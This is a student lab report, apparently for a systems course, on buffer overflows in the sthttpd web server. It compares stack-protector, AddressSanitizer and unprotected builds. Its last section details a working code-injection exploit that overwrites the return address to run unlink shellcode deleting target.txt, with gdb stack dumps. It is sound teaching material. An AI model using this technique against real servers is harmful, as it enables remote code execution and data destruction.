1.
I checked the PATH:
$ which gcc
This outputted the correct result.


///////////////////////////////////////////////////////
2.
I downloaded and compiled the code for the server with different flags:
wget http://web.cs.ucla.edu/classes/fall15/cs33/lab/sthttpd-2.27.0.tar.gz
tar -zxvf sthttpd-2.27.0.tar.gz

./configure \
   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"

make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
mv src/thttpd src/thttpd-sp

make clean
make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address'
mv src/thttpd src/thttpd-as

make clean
make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
mv src/thttpd src/thttpd-no


///////////////////////////////////////////////////////
3, 4.
(#3, #4 combined**)
I placed a file called test.txt containing text "hi\n" into the sthttpd-2.27.0 directory. Then, I tried to access it using curl on another instance of Putty.

src/thttpd-sp -p 12583 -D

I opened a new instance of Putty, then used the curl command.
curl http://localhost:12583/test.txt
//printed "hi\n"

src/thttpd-as -p 12584 -D
This gave me an error:
src/thttpd-as: error while loading shared libraries: libasan.so.2: cannot open shared object file: No such file or directory

I fixed it by recompiling using an additional flag: -static-libasan
make clean
make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
mv src/thttpd src/thttpd-as

Then I retried:
src/thttpd-as -p 12584 -D
This seemed to run the server.

In a new instance of Putty:
curl http://localhost:12584/test.txt
//printed "hi\n"
However, in the original terminal, I also got an error:
0x00000138aa60 is located 0 bytes inside of global variable 'str' defined in 'libhttpd.c:4072:17' (0x138aa60) of size 200
0x00000138aa67 is located 7 bytes inside of global variable 'str' defined in 'libhttpd.c:4072:17' (0x138aa60) of size 200
SUMMARY: AddressSanitizer: strcpy-param-overlap ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc:499 __interceptor_strcpy
==33446==ABORTING

I fixed this by modifying src/libhttpd.c:
Instead of (void) strcpy( str, &str[7] );
I changed the line to
{
char temp[200];
(void) strcpy(temp, &str[7]); 
(void) strcpy(str, temp);
}

Then I recompiled again, and ran the server.
src/thttpd-as -p 12584 -D
This seemed to run the server.

In new instance of Putty:
curl http://localhost:12584/test.txt
//printed "hi\n"

src/thttpd-no -p 12585 -D
In new instance of Putty:
curl http://localhost:12585/test.txt
//printed "hi\n"

All 3 servers seemed to run correctly.


//////////////////////////////////////////////////////////////////
5.
I tried creating a config.txt file with random characters. This didn't work and just ouputted 'unknown config option.'
I checked the source code of the read_config function again and realized that it was looking for specific words.
I rewrote the config.txt file to contain repeated strings of 'debug '.
Then ran again with gdb:

$ gdb --args src/thttpd-sp -p 12583 -D -C config.txt
Output:
(gdb) run
Starting program: /w/home.08/class/classnou/Desktop/lab3/sthttpd-2.27.0/src/thttpd-sp -p 12583 -D -C config.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
*** stack smashing detected ***: /w/home.08/class/classnou/Desktop/lab3/sthttpd-2.27.0/src/thttpd-sp terminated

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff6db1128 in ?? () from /lib64/libgcc_s.so.1
(gdb) bt
#0  0x00007ffff6db1128 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff6db2029 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00007ffff76e50a6 in backtrace () from /lib64/libc.so.6
#3  0x00007ffff7650e24 in __libc_message () from /lib64/libc.so.6
#4  0x00007ffff76e8a57 in __fortify_fail () from /lib64/libc.so.6
#5  0x00007ffff76e8a20 in __stack_chk_fail () from /lib64/libc.so.6
#6  0x0000000000405042 in read_config (filename=<optimized out>)
    at thttpd.c:1190
#7  0x7562656400677562 in ?? ()
#8  0x0067756265640067 in ?? ()
#9  0x6564006775626564 in ?? ()
#10 0x7562656400677562 in ?? ()
#11 0x0067756265640067 in ?? ()
#12 0x6564006775626564 in ?? ()
#13 0x7562656400677562 in ?? ()
#14 0x0067756265640067 in ?? ()
#15 0x6564006775626564 in ?? ()
#16 0x7562656400677562 in ?? ()
#17 0x0067756265640067 in ?? ()
#18 0x6564006775626564 in ?? ()
#19 0x0000000000677562 in ?? ()
#20 0x0000000000000000 in ?? ()


To figure out the instruction that caused the crash, I set disassemble-next-line on, and set a breakpoint at read_config and stepped through with nexti.
The function reached all the way to the end of read_config before reaching a jne 0x40503d <read_config+1533> and calling <__stack_chk_fail@plt>:
0x0000000000404f1d      1190        }
   0x0000000000404f0f <read_config+1231>:       48 8b 44 24 68  mov    0x68(%rsp),%rax
   0x0000000000404f14 <read_config+1236>:       64 48 33 04 25 28 00 00 00      xor    %fs:0x28,%rax
=> 0x0000000000404f1d <read_config+1245>:       0f 85 1a 01 00 00       jne    0x40503d <read_config+1533>
   0x0000000000404f23 <read_config+1251>:       48 83 c4 70     add    $0x70,%rsp
   0x0000000000404f27 <read_config+1255>:       5b      pop    %rbx
   0x0000000000404f28 <read_config+1256>:       5d      pop    %rbp
   0x0000000000404f29 <read_config+1257>:       41 5c   pop    %r12
   0x0000000000404f2b <read_config+1259>:       41 5d   pop    %r13
   0x0000000000404f2d <read_config+1261>:       41 5e   pop    %r14
   0x0000000000404f2f <read_config+1263>:       c3      retq
(gdb)
1190        }
=> 0x000000000040503d <read_config+1533>:       e8 6e d4 ff ff  callq  0x4024b0 <__stack_chk_fail@plt>
(gdb)
*** stack smashing detected ***: /w/home.08/class/classnou/Desktop/lab3/sthttpd-2.27.0/src/thttpd-sp terminated


It looks like at the end of read_config, the assembly includes some check on the state of the stack with callq  0x4024b0 <__stack_chk_fail@plt>.
This is confirmed by the backtrace, since <__stack_chk_fail@plt> is the last function before error handling starts.
This happens because the flag -fstack-protector-strong checks for stack overflow by using a canary.
So at the end of the function before the return process, it checks the state of the stack and discovers overflow.


///////////////////////////////////////////////////////////////////
6.
gdb --args src/thttpd-as -p 12584 -D -C config.txt
(gdb) run
Starting program: /w/home.08/class/classnou/Desktop/lab3/sthttpd-2.27.0/src/thttpd-as -p 12584 -D -C config.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
=================================================================
==19001==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffced4 at pc 0x00000045a468 bp 0x7fffffffce30 sp 0x7fffffffc5e0
READ of size 253 at 0x7fffffffced4 thread T0

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7073128 in ?? () from /lib64/libgcc_s.so.1
(gdb) bt
#0  0x00007ffff7073128 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff7074029 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x000000000048a466 in __sanitizer::BufferedStackTrace::SlowUnwindStack (this=0x7fffffffbd70, pc=4564072, max_depth=<optimized out>)
    at ../../../../gcc-5.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_posix_libcdep.cc:113
#3  0x00000000004868e2 in __asan::GetStackTraceWithPcBpAndContext (fast=false, context=0x0, bp=140737488342576, pc=<optimized out>, max_depth=256,
    stack=<optimized out>) at ../../../../gcc-5.2.0/libsanitizer/asan/asan_stack.h:43
#4  __asan_report_error (pc=<optimized out>, bp=bp@entry=140737488342576, sp=sp@entry=140737488340448, addr=addr@entry=140737488342740, 
is_write=is_write@entry=0,
    access_size=access_size@entry=253) at ../../../../gcc-5.2.0/libsanitizer/asan/asan_report.cc:1006
#5  0x000000000045a483 in __interceptor_strchr (
    str=str@entry=0x7fffffffce70 "debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug 
    debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug de"..., c=c@entry=35) at ../../../../gcc-5.2
    0/libsanitizer/asan/asan_interceptors.cc:430
#6  0x00000000004b1e51 in read_config (filename=<optimized out>) at thttpd.c:1018
#7  0x6564206775626564 in ?? ()
#8  0x7562656420677562 in ?? ()
#9  0x2067756265642067 in ?? ()
#10 0x6564206775626564 in ?? ()
#11 0x00007f000a677562 in ?? ()
#12 0x0000000000000006 in ?? ()
#13 0x0000000000408318 in main (argc=543651170, argv=<optimized out>) at thttpd.c:380


I set a breakpoint at read_config and set disassemble-next-line on, then stepped through with nexti:
The function didn't even finish before AddressSanitizer caught a problem with the stack.
0x00000000004b1e4c      1018            if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
   0x00000000004b1e43 <read_config+179>:        48 8b 3c 24     mov    (%rsp),%rdi
   0x00000000004b1e47 <read_config+183>:        be 23 00 00 00  mov    $0x23,%esi
=> 0x00000000004b1e4c <read_config+188>:        e8 3f 85 fa ff  callq  0x45a390 <__interceptor_strchr(char const*, int)>
   0x00000000004b1e51 <read_config+193>:        48 85 c0        test   %rax,%rax
   0x00000000004b1e54 <read_config+196>:        74 24   je     0x4b1e7a <read_config+234>
(gdb)
=================================================================
==21509==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffced4 at pc 0x00000045a468 bp 0x7fffffffce30 sp 0x7fffffffc5e0
READ of size 253 at 0x7fffffffced4 thread T0

The last assembly line executed before handling the error was callq  0x45a390 <__interceptor_strchr(char const*, int)>
The program seems to check for buffer problems while it executes, by calling <__interceptor_strchr(char const*, int)> repeatedly,
rather than checking at the end as thttpd-sp did. This makes sense because the flag -fsanitize=address specifies memory checking,
using special "poisoned redzones" next to the buffer, so the program will crash if there is a problem with accessing memory incorrectly,
such as storing past the end of the buffer.

7.
gdb --args src/thttpd-no -p 12585 -D -C config.txt
(gdb) run
Starting program: /w/home.08/class/classnou/Desktop/lab3/sthttpd-2.27.0/src/thttpd-no -p 12585 -D -C config.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x0000000000404d8b in read_config (filename=<optimized out>) at thttpd.c:1190
1190        }
(gdb) bt
#0  0x0000000000404d8b in read_config (filename=<optimized out>) at thttpd.c:1190
#1  0x7562656400677562 in ?? ()
#2  0x0067756265640067 in ?? ()
#3  0x6564006775626564 in ?? ()
#4  0x7562656400677562 in ?? ()
#5  0x0067756265640067 in ?? ()
#6  0x6564006775626564 in ?? ()
#7  0x7562656400677562 in ?? ()
#8  0x0067756265640067 in ?? ()
#9  0x6564006775626564 in ?? ()
#10 0x7562656400677562 in ?? ()
#11 0x0067756265640067 in ?? ()
#12 0x6564006775626564 in ?? ()
#13 0x0000000000677562 in ?? ()
#14 0x0000000000000000 in ?? ()

The backtrace shows that there was no special check before the Segmentation fault to detect problems.
So I stepped through read_config in gdb with set disassemble-next-line on. The end of the output shows:
0x0000000000404d8b      1190        }
   0x0000000000404d7f <read_config+1215>:       48 83 c4 70     add    $0x70,%rsp
   0x0000000000404d83 <read_config+1219>:       5b      pop    %rbx
   0x0000000000404d84 <read_config+1220>:       5d      pop    %rbp
   0x0000000000404d85 <read_config+1221>:       41 5c   pop    %r12
   0x0000000000404d87 <read_config+1223>:       41 5d   pop    %r13
   0x0000000000404d89 <read_config+1225>:       41 5e   pop    %r14
=> 0x0000000000404d8b <read_config+1227>:       c3      retq
(gdb)

Program received signal SIGSEGV, Segmentation fault.
0x0000000000404d8b in read_config (filename=<optimized out>) at thttpd.c:1190
1190        }
   0x0000000000404d7f <read_config+1215>:       48 83 c4 70     add    $0x70,%rsp
   0x0000000000404d83 <read_config+1219>:       5b      pop    %rbx
   0x0000000000404d84 <read_config+1220>:       5d      pop    %rbp
   0x0000000000404d85 <read_config+1221>:       41 5c   pop    %r12
   0x0000000000404d87 <read_config+1223>:       41 5d   pop    %r13
   0x0000000000404d89 <read_config+1225>:       41 5e   pop    %r14
=> 0x0000000000404d8b <read_config+1227>:       c3      retq

The last assembly instruction before the Segmentation fault was retq. It looks like the program was allowed to continue and overwrite
the return address, so an error was only detected upon attempting to return and finding gibberish in the old return address.
There were no special checks before this point, which makes sense because the flags specified no stack protection.


/////////////////////////////////////////////////////
8.
I created the .s files with:
gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o thttpd-sp.s
gcc -S -O2 -fno-inline -fsanitize=address -I .. -I . thttpd.c -o thttpd-as.s
gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack -I .. -I . thttpd.c -o thttpd-no.s

The -sp version uses a stack protector via a canary past the stack frame. From the assembly, it is possible to find calls to __stack_chk_fail after xorq %fs:40, %rax.
Something similar was also found in the trace from question 5. It looks like some functions in this version check the value of a canary at
the end of the function to make sure there has not been an overflow of the stack frame.

The -as version is slightly different since it keeps track of memory locations that are valid by using shadow regions and redzones.
This version allocates special areas past the buffer that should not be accessed, and periodically checks those areas for illegal memory accesses,
throwing an error if there is a problem. In the assembly, you can find calls to asan_report...The instructions check for shadow bytes to equal zero,
otherwise calling functions from __asan.

The -no version does not check for overflow errors, since there is no stack protection specified. The program may crash at the end when trying to return,
if it has overwritten the old rip.


/////////////////////////////////////////////////////////
9.
I managed to delete target.txt by injecting code onto the stack. My exploit only works in gdb, due to aslr being turned off with debugging.
First, I ran the server in gdb, with a breakpoint in read_config to check the stack and location of registers.

First, I created a file exploit.txt, containing "port=target.txt"
I then appended a hex to raw converted zero-byte to the end.

$ gdb --args src/thttpd-no -p 12585 -D -C exploit.txt
(gdb) break read_config
(gdb) run
(gdb) info frame
Stack level 0, frame at 0x7fffffffd070:
 rip = 0x4048c0 in read_config (thttpd.c:1000); saved rip = 0x4051bf
 called by frame at 0x7fffffffd0b0
 source language c.
 Arglist at 0x7fffffffd060, args: filename=0x7fffffffe5f6 "exploit.txt"
 Locals at 0x7fffffffd060, Previous frame's sp is 0x7fffffffd070
 Saved registers:
  rip at 0x7fffffffd068

This specified that the saved rip points to location 0x7fffffffd068, so if I could overflow the buffer all the way to that spot,
then I could try to store a pointer to my own function into location 0x7fffffffd068, so that when read_config returns,
rip will have a pointer to my own code.

I wrote a function in delete.c using asm() with a syscall to unlink the file target.txt. This required storing 0x57
(decimal 87 found from syscall table for x86-64 at http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64) into %rax,
then passing a pointer to "target.txt" (stored on buffer) into %rdi first. To find the location of "target.txt," I used gdb:
(gdb) print &line
$1 = (char (*)[100]) 0x7fffffffcfd0

Then I counted some initial offset, since the buffer actually starts with "port=target.txt\0..." so target.txt\0 really starts at 0x7fffffffcfd5.
This is the value I placed into rdi before the syscall to unlink.

Next, I got the assembly of delete.c, then converted to bytecode with objdump:
$ gcc -O2 -c delete.c
$ objdump -d delete.o
I extracted the bytecode from this, converted the hex chars to raw values, and appended it to my exploit.txt file:
$ cat hexdelete.txt | ../hex2raw > rawdelete.txt
$ cat rawdelete.txt >> exploit.txt

I added some random chars to the end of exploit.txt, then appended the address of the start of my bytecode to the very end,
at the location where the string would overflow into rip. This was done with trial and error and by printing the stack in gdb using x/50x $sp.
In the end, I verified that I had the right values stored to the right locations:
(gdb) info frame
Stack level 0, frame at 0x7fffffffd070:
 rip = 0x404d77 in read_config (thttpd.c:1189); saved rip = 0x7fffffffcfe0
 called by frame at 0x7fffffffd078
 source language c.
 Arglist at 0x7fffffffcfc8, args: filename=<optimized out>
 Locals at 0x7fffffffcfc8, Previous frame's sp is 0x7fffffffd070
 Saved registers:
  rbx at 0x7fffffffd040, rbp at 0x7fffffffd048, r12 at 0x7fffffffd050,
  r13 at 0x7fffffffd058, r14 at 0x7fffffffd060, rip at 0x7fffffffd068

This checks that the valued stored into saved rip = 0x7fffffffcfe0, which is the value I want, since this is the location of the start of my bytecode in the buffer.
This can be verified by checking the contents of the stack against the file hexdelete.txt, which contains the hex version of my delete() function.

(gdb) x/50x $sp
0x7fffffffcfd0: 0x74726f70      0x72617400      0x2e746567      0x00747874
0x7fffffffcfe0: 0x57c0c748      0x48000000      0xffcfd5bf      0x007fffff
0x7fffffffcff0: 0xc3050f00      0x31313131      0x31313131      0x31313131
0x7fffffffd000: 0x31313131      0x31313131      0x31313131      0x31313131
0x7fffffffd010: 0x31313131      0x31313131      0x31313131      0x31313131
0x7fffffffd020: 0x31313131      0x31313131      0x31313131      0x31313131
0x7fffffffd030: 0x31313131      0x31313131      0x31313131      0x31313131
0x7fffffffd040: 0x31313131      0x31313131      0x31313131      0x31313131
0x7fffffffd050: 0x31313131      0x31313131      0x31313131      0x31313131
0x7fffffffd060: 0x31313131      0x31313131      0xffffcfe0      0x00007fff
0x7fffffffd070: 0x0000000a      0x00000000      0xffffe5dd      0x00007fff
0x7fffffffd080: 0xffffd160      0x00007fff      0xffffd0e0      0x00007fff
0x7fffffffd090: 0xffffe300      0x00007fff

Then, I ran the server in gdb, and it correctly deleted the file target.txt I created in the directory:
$ gdb --args src/thttpd-no -p 12585 -D -C exploit.txt
(gdb) run